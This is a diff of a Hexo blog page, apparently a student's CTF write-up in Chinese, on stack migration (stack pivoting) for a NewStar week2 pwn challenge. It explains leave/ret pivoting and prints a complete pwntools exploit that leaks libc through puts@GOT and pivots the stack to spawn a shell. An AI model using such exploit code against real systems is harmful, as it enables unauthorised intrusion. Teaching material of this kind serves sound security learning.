@@ -5,8 +5,8 @@
   <meta name="Volantis" content="5.8.0">
   <meta charset="utf-8">
   <!-- SEO相关 -->
-  <meta name="robots" content="noindex,follow">
-  <link rel="canonical" href="http://example.com/archives/2024/08/"/>
+  
+  <link rel="canonical" href="http://example.com/2024/09/04/栈迁移/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -33,16 +33,21 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>Archive: 2024/8 - Hexo</title>
-  <meta name="keywords" content="null">
+  <title>Hello Hnu！ - Hexo</title>
+  <meta name="keywords" content="知识分享,null">
   <meta desc name="description" content="Hexo - John Doe - Hexo">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/archives/2024/08/index.html">
+  
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hello Hnu！">
+<meta property="og:url" content="http://example.com/2024/09/04/%E6%A0%88%E8%BF%81%E7%A7%BB/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="栈迁移当可操控的栈空间不多时可以尝试 原理在x64架构下，栈空间通过rsp和rbp寄存器进行标识，在函数执行的开始时，会执行call指令，在函数结束时，会执行leave ret返回 12345678910111213141516函数调用时栈空间操作的最基本情况 -&gt; 函数调用：callmov %rsp,%rbppush %eip# 函数返回地址压入栈内，此时rsp自动减去0x8push %r">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
+<meta property="article:published_time" content="2024-09-04T07:46:25.049Z">
+<meta property="article:modified_time" content="2024-09-04T08:45:17.571Z">
 <meta property="article:author" content="John Doe">
+<meta property="article:tag" content="知识分享">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
   <style>
@@ -2052,7 +2057,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <!-- Custom Files bodyBegin end-->
     <!-- front-matter body_begin begin -->
     <!-- front-matter body_begin end -->
-    <header itemscope itemtype="http://schema.org/WPHeader" id="l_header" class="l_header auto shadow floatable blur " style='opacity: 0' >
+    <header itemscope itemtype="http://schema.org/WPHeader" id="l_header" class="l_header auto shadow floatable blur show" style='opacity: 0' >
   <div class='container'>
   <div id='wrapper'>
     <div class='nav-sub'>
@@ -2321,7 +2326,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     
       <!-- see: /layout/_partial/scripts/_ctrl/coverCtrl.ejs -->
-      <div id="half" class='cover-wrapper  search' style="display: ;">
+      <div id="none" class='cover-wrapper post search' style="display: none;">
         
   <div class='cover-bg lazyload placeholder' data-bg="https://s2.loli.net/2024/08/20/XznLVif8uGoETrU.jpg"></div>
 
@@ -2392,26 +2397,8 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
         <div class="body-wrapper">
           
 <div id="l_main" class=''>
-	
-		
-  <section class="post-list">
-    
-      
-        
-          
-        
-          
-        
-          
-        
-      
-    
-    
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2024/08/30/Newstar-week1/">
+  <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2024/09/04/栈迁移/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="Hexo">
   </span>
@@ -2420,190 +2407,242 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <meta itemprop="description" content="">
   </span>
   
-  
+
+
   
     <span hidden>
       <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
     </span>
   
-  
+  <div class="article-meta" id="top">
     
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2024/08/30/Newstar-week1/"  itemprop="url">
-        Newstar week1
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
     
-      
-        
-Ret2text很简单的栈溢出，checksec一下
-64位，没开pie，运行一下看看没什么特殊的，直接丢ida里反编译看一眼很明显的栈溢出，溢出大小为0x20+0x8，直接开始简单的脚本攻击以下是exp
-1234567891011121314151617from pwn import *#p = process([&#x27;./Ret2text&#x27;])p = remote(&#...
-      
     
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2024-08-30T09:29:50+08:00">2024-08-30</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/write-up/">write up</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/write-up/" itemprop="url"><span itemprop="name">write up</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2024/08/30/Newstar-week1/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2024/08/19/PWN-orange/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="Hexo">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="Hexo">
-    <meta itemprop="description" content="">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2024/08/19/PWN-orange/"  itemprop="url">
+      <h1 class="title" itemprop="name headline">
         Hello Hnu！
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      
+      </h1>
+      <div class='new-meta-box'>
         
-netcat通过题目不难看出，nc 一下即可
-shellcode拿到题目第一步 checksec 一下打开的栈不可执行，丢 ida 里看看产生了一段可执行段，进 gdb 验证一下很明显产生了一段可执行段，注意到 read 限制了输入大小，所以只能自己制作一段以下是攻击脚本from LibcSearcher import LibcSearcherfrom pwn import *
-conte...
-      
+          
+            
+<div class='new-meta-item author' itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <a itemprop="url" class='author' href="/" rel="nofollow">
+    <img itemprop="image" src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/apple-touch-icon.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/apple-touch-icon.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+    <p itemprop="name">请设置文章作者</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class='new-meta-item category'>
+    <i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i>
+    <a class="category-link" href="/categories/%E7%9F%A5%E8%AF%86%E5%88%86%E4%BA%AB/">知识分享</a>
+    
+      <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
+        <a href="/categories/%E7%9F%A5%E8%AF%86%E5%88%86%E4%BA%AB/" itemprop="url"><span itemprop="name">知识分享</span></a>
+      </span>
     
   </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2024-08-19T23:46:26+08:00">2024-08-19</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/write-up/">write up</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/write-up/" itemprop="url"><span itemprop="name">write up</span></a>
-            </span>
+
+
           
         
+          
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2024-09-04T15:46:25+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Sep 4, 2024</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+
+
+
+          
+        
+        <!-- Custom Files topMeta begin-->
+        
+        <!-- Custom Files topMeta end-->
       </div>
+    
+  </div>
+
+
+  <div id="layoutHelper-page-plugins"></div>
+  <div id="post-body" itemprop="articleBody">
+    <h1 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h1><p>当可操控的栈空间不多时可以尝试</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在x64架构下，栈空间通过<code>rsp</code>和<code>rbp</code>寄存器进行标识，在函数执行的开始时，会执行call指令，在函数结束时，会执行leave ret返回</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">函数调用时栈空间操作的最基本情况 -&gt;</span><br><span class="line"> </span><br><span class="line">函数调用：</span><br><span class="line">call</span><br><span class="line">mov %rsp,%rbp</span><br><span class="line">push %eip# 函数返回地址压入栈内，此时rsp自动减去0x8</span><br><span class="line"></span><br><span class="line">push %rbp        # 保存父函数栈底指针到栈内，此时rsp自动减去0x8</span><br><span class="line">mov %rsp,$rbp    # 设置被调用函数的栈底指针</span><br><span class="line">sub xxx,%rsp     # 分配栈空间</span><br><span class="line"> </span><br><span class="line">leave            # 相当于下方指令进行的操作</span><br><span class="line">    mov %rbp,%rsp;   ## 释放之前分配的栈空间</span><br><span class="line">    pop %rbp         ## 从栈上取出之前保存的父函数栈底指针到rbp，此时rsp自动加上0x8</span><br><span class="line">ret              </span><br><span class="line">	pop %eip# 从栈上取出返回地址，然后返回，此时rsp自动加上0x8</span><br></pre></td></tr></table></figure>
+
+<h2 id="栈迁移如何进行"><a href="#栈迁移如何进行" class="headerlink" title="栈迁移如何进行"></a>栈迁移如何进行</h2><p>想要把栈空间迁移到指定的位置，核心的原理就是修改<code>rsp</code>和<code>rbp</code>寄存器的数值，让它们指向我们期望中的位置。</p>
+<p>首先，我们需要在搞清楚输入的数据位于栈内的地址，接着我们可以往栈内填入需要的内容，例如pop_rdi，ret，等的地址来构造shellcode，再补全payload直至<strong>rbp</strong>的位置，往<strong>rep</strong>里填入需要返回的地址<strong>back_addr-0x8</strong>（32位加上0x4，后面会清楚为什么的），在函数返回地址的空间内填入<strong>leave_ret_addr</strong>，当函数执行结束时，首先会执行<strong>mov rsp,rbp</strong>，将栈顶和栈底放置于同一个位置，<strong>pop rbp</strong>，此时<strong>ebp</strong>会返回我们已经填入返回地址<strong>back_addr-0x8</strong>，<strong>pop rip</strong>，此时<strong>rip</strong>会指向<strong>leave_ret_addr</strong>，随后再次执行<strong>leave ret</strong>, <strong>mov rsp,rbp</strong>,将栈顶和栈底放置于同一个位置,<strong>pop</strong> <strong>rbp</strong>,此时<strong>rsp</strong>会自动加<strong>0x8</strong>，到达<strong>back_addr</strong>，<strong>pop rip</strong>,接着执行我们填入的东西，到这里栈迁移的过程已经差不多结束了。</p>
+<p><strong>接下来进入实战</strong></p>
+<h2 id="stack-migration"><a href="#stack-migration" class="headerlink" title="stack migration"></a>stack migration</h2><blockquote>
+<p>来自newstar week2，可以自己去buuctf自行下载</p>
+</blockquote>
+<p>如题，栈迁移，做题前自己去了解了以下，打算把自己的理解写出来，详见我的博客cwj-happy.github.io</p>
+<p>拿到题先checksec一下，看看开了什么保护</p>
+<p><img src="https://raw.githubusercontent.com/cwj-happy/picgo/main/QQ_1725416824430.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/cwj-happy/picgo/main/QQ_1725416824430.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img"></p>
+<p>没开pie，给了libc文件，很明显的提示，进ida反编译验证一下猜想</p>
+<p><img src="https://raw.githubusercontent.com/cwj-happy/picgo/main/image-20240904103035450.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/cwj-happy/picgo/main/image-20240904103035450.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240904103035450"></p>
+<p><img src="https://raw.githubusercontent.com/cwj-happy/picgo/main/image-20240904103053655.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/cwj-happy/picgo/main/image-20240904103053655.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240904103053655"></p>
+<p>给了buf的地址，v2可以栈溢出，但没给足够的空间，这里可以想到用栈迁移实现变相拉大溢出空间的效果，然后通过泄露puts_got表地址，找到libc基地址，加上偏移找到system地址和bin&#x2F;sh地址，填入栈空间，最终得到shell</p>
+<p><img src="https://raw.githubusercontent.com/cwj-happy/picgo/main/image-20240904103758516.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/cwj-happy/picgo/main/image-20240904103758516.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240904103758516"></p>
+<p>这里先随意输个字符，通过第一个read，接收buf地址，接着构造payload泄露puts_got表地址</p>
+<p><img src="https://raw.githubusercontent.com/cwj-happy/picgo/main/image-20240904104057459.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/cwj-happy/picgo/main/image-20240904104057459.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240904104057459"></p>
+<p>拿到puts_got表地址，接着就是正常ret2libc，重复和上面的操作即可拿到shell</p>
+<blockquote>
+<p>这里其实可以直接用buf 的地址算出libc基地址，简便很多，详情见官方write up</p>
+</blockquote>
+<p>以下是完整exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import LibcSearcher</span></span><br><span class="line">filename=<span class="string">&#x27;./stack&#x27;</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node5.buuoj.cn&#x27;,27127)</span></span><br><span class="line">p=process(filename)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x401333</span></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line">leave=<span class="number">0x4012aa</span></span><br><span class="line">main=<span class="number">0x4011fb</span></span><br><span class="line"></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;name:\n&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;you: &#x27;</span>)</span><br><span class="line">buf=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)+<span class="number">8</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(buf))</span><br><span class="line">payload=p64(ret)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">payload=payload.ljust(<span class="number">80</span>,<span class="string">b&#x27;a&#x27;</span>)+p64(buf)+p64(leave)</span><br><span class="line">p.sendafter(<span class="string">&quot;more infomation plz:\n&quot;</span>,payload)</span><br><span class="line"><span class="comment">#p.recvuntil(b&#x27;plz:&#x27;)</span></span><br><span class="line"><span class="comment">#p.sendline(payload)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;soon!\n&#x27;</span>)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base=puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;name:\n&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x7</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;you: &#x27;</span>)</span><br><span class="line">buf=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)+<span class="number">8</span></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(sys)</span><br><span class="line">payload1=payload1.ljust(<span class="number">0x50</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload1+=p64(buf)+p64(leave)</span><br><span class="line">p.sendafter(<span class="string">&quot;more infomation plz:\n&quot;</span>,payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2>
+  </div>
+  
+  
+    
+    <div class='footer'>
+       <!-- 参考资料、相关资料等 -->
       
-        <div>
-          <a class='readmore' href='/2024/08/19/PWN-orange/' itemprop="url">
-            Read More
-          </a>
-        </div>
+       <!-- 相关文章 -->
+      
+      <!-- 版权声明组件 -->
+      
+      <!-- 打赏组件 -->
       
     </div>
   
+  
+    
 
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2024-09-04T16:45:17+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：Sep 4, 2024</p>
+  </a>
 </div>
 
-          </div>
         
       
         
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2024/08/19/hello-world/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="Hexo">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="Hexo">
-    <meta itemprop="description" content="">
-  </span>
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E7%9F%A5%E8%AF%86%E5%88%86%E4%BA%AB/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>知识分享</p></a></div>
+  <span hidden itemprop="keywords">知识分享</span>
+
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2024/09/04/%E6%A0%88%E8%BF%81%E7%A7%BB/&title=Hello Hnu！ - Hexo&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qq.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qq.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2024/09/04/%E6%A0%88%E8%BF%81%E7%A7%BB/&title=Hello Hnu！ - Hexo&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qzone.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qzone.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2024/09/04/%E6%A0%88%E8%BF%81%E7%A7%BB/&title=Hello Hnu！ - Hexo&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/weibo.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/weibo.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+    <!-- Custom Files bottomMeta begin -->
+    
+    <!-- Custom Files bottomMeta end -->
+  </div>
+
+
   
   
+
   
+    <div class="prev-next">
+      
+      
+        <a class='next' href='/2024/09/02/iamorange--fmt2__got-it/'>
+          <p class='title'>iamorange--fmt2/got-it<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>fmt2checksec一下，开了pie保护，nx保护运行一遍瞧瞧，有格式化字符串漏洞丢ida里反编译看看，可以看到，当参数a等于’deadeef’,就可以执行sys，看看a的位置吧进gdb调试...</p>
+        </a>
+      
+    </div>
+  
+  <!-- Custom Files postEnd begin-->
+  
+  <!-- Custom Files postEnd end-->
+</article>
+
+
+  
+
+
+  <article class="post white-box shadow floatable blur" id="comments">
     <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
+      <meta itemprop="discussionUrl" content="/2024/09/04/%E6%A0%88%E8%BF%81%E7%A7%BB/index.html#comments">
     </span>
-  
-  
+    <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2024/08/19/hello-world/"  itemprop="url">
-        Hello World
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      
-        Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.
-Qu...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2024-08-19T10:51:34+08:00">2024-08-19</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2024/08/19/hello-world/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
 
-</div>
+    <div id="layoutHelper-comments"></div>
 
-          </div>
-        
-      
-    
-  </section>
-  
-    
-  
+  </article>
 
 
-	
+
+
+
+
 </div>
 <aside id='l_side' itemscope itemtype="http://schema.org/WPSideBar">
   
@@ -2612,162 +2651,52 @@ Qu...
     
     
       
-<section class="widget blogger desktop mobile pjax">
-  <div class='content'>
-    
-      
-        <a class='avatar flat-box circle' href='/about/'>
-          <img no-lazy src='https://prod-chat-kimi.tos-s3-cn-beijing.volces.com/prod-chat-kimi/cp0t27j5cfuj3ge43lcg/2024-08-20/cr1vhd2vk6g3ans0u9o0/%E6%A9%99%E5%AD%90.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKLTYTJlNjgwMjY2ZDBkNDFiYmI5YWNiZDBlZmFmYjIzZTA%2F20240820%2Fcn-beijing%2Fs3%2Faws4_request&X-Amz-Date=20240820T020020Z&X-Amz-Expires=518400&X-Amz-SignedHeaders=host&X-Amz-Signature=05685d80af66504d8629c0280c0e240614d6c2dc45c4091d160db2bc8da28841'/>
-        </a>
-      
-    
-    
-      <div class='text'>
-        
-          <h2>iamorange</h2>
-        
-        
-        
-          <p><span id="jinrishici-sentence">Hexo</span></p>
-          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
-        
-      </div>
-    
-    
-      <div class="social-wrapper">
-        
-          
-            <a href="/atom.xml"
-              class="social fa-solid fa-rss flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="/cwj90688609@163.com"
-              class="social fa-solid fa-envelope flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="https://github.com/cwj-happy/"
-              class="social fab fa-github flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="/"
-              class="social fa-solid fa-headphones-alt flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-      </div>
-    
-  </div>
-</section>
-
-    
-  
-
-  
-    
-    
-      
-  
-  <section class="widget category desktop pjax">
-    
-  <header>
-    
-      <a href='/blog/categories/'><i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i><span class='name'>文章分类</span></a>
-    
-  </header>
-
-
-    <div class='content'>
-      <ul class="entry navigation">
-        
-          <li><a class="flat-box"
-            title="/categories/write-up/" href="/categories/write-up/"
-            active-action="action-categorieswrite-up"
-            ><div class='name'>write up</div><div class='badge'>(4)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/%E7%9F%A5%E8%AF%86%E5%88%86%E4%BA%AB/" href="/categories/%E7%9F%A5%E8%AF%86%E5%88%86%E4%BA%AB/"
-            active-action="action-categoriesE79FA5E8AF86E58886E4BAAB"
-            ><div class='name'>知识分享</div><div class='badge'>(1)</div></a></li>
-        
-      </ul>
-    </div>
-  </section>
-
-
-    
-  
-
-  
-    
-    
-      
-  
-  <section class="widget tagcloud desktop mobile pjax">
-    
-  <header>
-    
-      <a href='/blog/tags/'><i class="fa-solid fa-tags fa-fw" aria-hidden="true"></i><span class='name'>热门标签</span></a>
-    
-  </header>
-
-
-    <div class='content'>
-      <a href="/tags/write-up/" style="font-size: 24px; color: #555">write up</a> <a href="/tags/%E5%A4%8D%E7%8E%B0/" style="font-size: 19px; color: #777">复现</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 14px; color: #999">比赛</a> <a href="/tags/%E7%9F%A5%E8%AF%86%E5%88%86%E4%BA%AB/" style="font-size: 14px; color: #999">知识分享</a>
-    </div>
-  </section>
-
-
-    
-  
-
-  
-
-  
-    
-    
-      
-<section class="widget text desktop pjax">
-  
-  <header>
-    
-      <a target="_blank" rel="noopener" href='https://github.com/xaoxuu/'><i class="fab fa-github fa-fw" aria-hidden="true"></i><span class='name'>点个赞吧</span></a>
-    
-  </header>
-
-
-  <div class='content'>
-    
-  </div>
-</section>
-
     
   
 
 
 <div class="widget-sticky pjax">
 
+  
+  
+
+
+  <section class="widget toc-wrapper desktop mobile " id="toc-div" >
+    
+  <header>
+    
+      <i class="fa-solid fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C"><span class="toc-text">栈迁移如何进行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#stack-migration"><span class="toc-text">stack migration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text"></span></a></li></ol>
+    </div>
+  </section>
+
+  
+
 </div>
 
 
 <!-- 没有 pjax 占位会报错 万恶的 pjax -->
+
